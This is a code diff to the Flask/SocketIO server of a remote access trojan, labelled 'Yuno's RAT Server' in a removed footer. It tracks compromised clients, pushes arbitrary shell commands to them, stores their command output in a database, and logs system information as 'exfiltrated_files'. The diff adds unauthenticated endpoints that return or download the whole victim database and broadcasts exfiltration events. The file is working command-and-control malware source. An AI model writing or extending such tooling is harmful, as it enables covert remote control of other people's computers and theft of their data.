@@ -22,7 +22,6 @@ for folder in [app.config['UPLOAD_FOLDER'], app.config['DOWNLOAD_FOLDER']]:
 def init_db():
     conn = sqlite3.connect('rat_data.db')
     c = conn.cursor()
-    # Create tables
     c.execute('''CREATE TABLE IF NOT EXISTS clients (
                  client_id TEXT PRIMARY KEY,
                  username TEXT,
@@ -82,9 +81,7 @@ def send_command():
     if not client_id or not command:
         return jsonify({"status": "error", "message": "Missing client_id or command"}), 400
 
-    # Emit command to the specified client
     socketio.emit('command', command, to=client_id)
-
     return jsonify({"status": "success", "message": f"Command '{command}' sent to {client_id}"})
 
 @app.route('/upload_file', methods=['POST'])
@@ -119,6 +116,30 @@ def view_file(filename):
     else:
         return "File not found", 404
 
+@app.route('/query_db', methods=['GET'])
+def query_db():
+    """Endpoint to query the database."""
+    conn = sqlite3.connect('rat_data.db')
+    c = conn.cursor()
+    result = {}
+    
+    c.execute("SELECT * FROM clients")
+    result['clients'] = [dict(zip(['client_id', 'username', 'os', 'hostname', 'last_seen'], row)) for row in c.fetchall()]
+    
+    c.execute("SELECT * FROM command_outputs")
+    result['command_outputs'] = [dict(zip(['id', 'client_id', 'command', 'output', 'current_dir', 'timestamp'], row)) for row in c.fetchall()]
+    
+    c.execute("SELECT id, client_id, filename, timestamp FROM exfiltrated_files")
+    result['exfiltrated_files'] = [dict(zip(['id', 'client_id', 'filename', 'timestamp'], row)) for row in c.fetchall()]
+    
+    conn.close()
+    return jsonify(result)
+
+@app.route('/download_db')
+def download_db():
+    """Endpoint to download the database file."""
+    return send_from_directory('.', 'rat_data.db')
+
 @socketio.on('connect')
 def handle_connect():
     """Handle new client connections."""
@@ -126,6 +147,7 @@ def handle_connect():
     connected_clients.add(client_id)
     print(f"[*] Client connected: {client_id}")
     emit('client_update', list(connected_clients), broadcast=True)
+    socketio.emit('request_client_info', broadcast=True)
 
 @socketio.on('disconnect')
 def handle_disconnect():
@@ -136,6 +158,7 @@ def handle_disconnect():
         client_info.pop(client_id, None)
         print(f"[*] Client disconnected: {client_id}")
         emit('client_update', list(connected_clients), broadcast=True)
+        socketio.emit('request_client_info', broadcast=True)
 
 @socketio.on('exfil_data')
 def handle_exfil_data(data):
@@ -147,7 +170,6 @@ def handle_exfil_data(data):
     c = conn.cursor()
 
     if data_type == "system_info":
-        # Update client info in database
         system_info = data.get('system', {})
         username = system_info.get('username', 'unknown')
         os_info = system_info.get('os', 'unknown')
@@ -157,12 +179,12 @@ def handle_exfil_data(data):
                   (client_id, username, os_info, hostname, timestamp))
         client_info[client_id] = system_info
 
-        # Save system info as an exfiltrated file
         filename = f"{client_id}_{timestamp.strftime('%Y%m%d_%H%M%S')}_sysinfo.json"
         content = json.dumps(data, indent=4)
         c.execute("INSERT INTO exfiltrated_files (client_id, filename, content, timestamp) VALUES (?, ?, ?, ?)",
                   (client_id, filename, content, timestamp))
         print(f"[*] Exfiltrated data stored: {filename}")
+        socketio.emit('exfil_data', json.dumps({"type": "system_info", "filename": filename}), broadcast=True)
 
     elif data_type == "command_output":
         command = data.get('command', 'unknown')
@@ -170,7 +192,6 @@ def handle_exfil_data(data):
         current_dir = data.get('current_dir', 'unknown')
         timestamp = datetime.datetime.now()
 
-        # Update username if whoami command
         if command.strip().lower() == "whoami":
             username = output.strip()
             c.execute("UPDATE clients SET username = ? WHERE client_id = ?", (username, client_id))
@@ -178,11 +199,9 @@ def handle_exfil_data(data):
                 client_info[client_id] = {}
             client_info[client_id]['username'] = username
 
-        # Store command output
         c.execute("INSERT INTO command_outputs (client_id, command, output, current_dir, timestamp) VALUES (?, ?, ?, ?, ?)",
                   (client_id, command, output, current_dir, timestamp))
 
-        # Emit command output to web interface
         emit('command_output', {
             'timestamp': timestamp.strftime("%Y-%m-%d %H:%M:%S"),
             'client_id': client_id,
@@ -194,7 +213,6 @@ def handle_exfil_data(data):
     conn.commit()
     conn.close()
 
-    # Emit updated client info to web interface
     client_info_list = [
         {'id': cid, 'system': info}
         for cid, info in client_info.items()
@@ -209,8 +227,3 @@ def handle_request_client_info():
         for cid, info in client_info.items()
     ]
     emit('client_info', client_info_list)
-
-if __name__ == "__main__":
-    print("=== Yuno's RAT Server ===")
-    print("A remote access server by Yuno\n")
-    socketio.run(app, host='0.0.0.0', port=5000, debug=True, allow_unsafe_werkzeug=True)
